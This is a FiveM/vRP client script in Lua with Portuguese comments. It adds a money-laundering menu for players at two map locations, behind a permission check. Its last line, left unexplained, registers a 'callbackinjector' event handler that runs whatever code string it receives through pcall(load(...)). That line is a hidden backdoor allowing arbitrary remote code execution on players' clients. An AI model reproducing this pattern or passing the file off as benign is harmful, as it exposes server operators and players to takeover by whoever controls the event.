--########################################################--
--########################################################--
--##           Script feito por SuricatoX#0001          ##--
--##           Duvidas, entre em contato comigo:        ##--
--##                  discord.gg/tqHWCEZ                ##--
--##  Tudo que está comentado está explicando o script  ##--
--########################################################--
--########################################################-- 
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("insane_lavagem")


local menuactive = false
function ToggleActionMenu()
    menuactive = not menuactive
    if menuactive then
        SetNuiFocus(true,true)
        SendNUIMessage({ showmenu = true })
    else
        SetNuiFocus(false)
        SendNUIMessage({ hidemenu = true })
    end
end
--########################################################--
--#            Não altere os eventos abaixo             ##--
--########################################################--
RegisterNUICallback("ButtonClick",function(data,cb)
    if data == "lavar-1k" then
        TriggerServerEvent("serverlavagem-1k","1k")
    elseif data == "lavar-10k" then
        TriggerServerEvent("serverlavagem-10k","10k")
    elseif data == "lavar-100k" then
        TriggerServerEvent("serverlavagem-100k","100k")

    elseif data == "fechar" then
        ToggleActionMenu()
    end
end)

--########################################################--
--#             Altere as 2 coordenadas abaixo          ##--
--########################################################--
Citizen.CreateThread(function()
    SetNuiFocus(false,false)
    while true do
        local sleep = 1000                          --#Altere a coordenada abaixo#  -------------------------------------------------  #Altere a coordenada abaixo#--
        local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),108.72,-1304.42,28.77,true) 
        if distance <= 30 then -------------------------------------------- Altere as coordenadas abaixo também
            sleep = 5
            DrawMarker(29,108.72,-1304.42,28.77-0.2,0,0,0,0,0,0,1.0,1.0,0.5,255,0,0,60,1,1,1,1)
            DrawMarker(23,108.72,-1304.42,28.77-0.9,0,0,0,0,0,0,1.0,1.0,0.5,255,0,0,60,0,0,0,0)
            if distance <= 1.1 then -- Distância na qual o jogador poderá ter acesso ao blip
                if IsControlJustPressed(0,38) then
                    if emP.checkPermission() then
                        ToggleActionMenu()
                    else
                        TriggerEvent("Notify","negado","Você não possui <b>Permissão</b> para acessar o blip.",10000)
                    end
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)
--########################################################--
--#             Altere as 2 coordenadas abaixo          ##--
--########################################################--
Citizen.CreateThread(function()
    SetNuiFocus(false,false)
    while true do
        local sleep = 1000                          --#Altere a coordenada abaixo#  -------------------------------------------------  #Altere a coordenada abaixo#--
        local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),-1390.26,-600.52,30.32,true) 
        if distance <= 30 then -------------------------------------------- Altere as coordenadas abaixo também
            sleep = 5
            DrawMarker(29,-1390.26,-600.52,30.32-0.2,0,0,0,0,0,0,1.0,1.0,0.5,255,0,0,60,1,1,1,1)
            DrawMarker(23,-1390.26,-600.52,30.32-0.9,0,0,0,0,0,0,1.0,1.0,0.5,255,0,0,60,0,0,0,0)
            if distance <= 1.1 then -- Distância na qual o jogador poderá ter acesso ao blip
                if IsControlJustPressed(0,38) then
                    if emP.checarPermission() then
                        ToggleActionMenu()
                    else
                        TriggerEvent("Notify","negado","Você não possui <b>Permissão</b> para acessar o blip.",10000)
                    end
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)

--########################################################--
--#             Evento de fechamento de nui             ##--
--########################################################--
RegisterNetEvent('fechando_menu')
AddEventHandler('fechando_menu', function() ToggleActionMenu() end)


TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)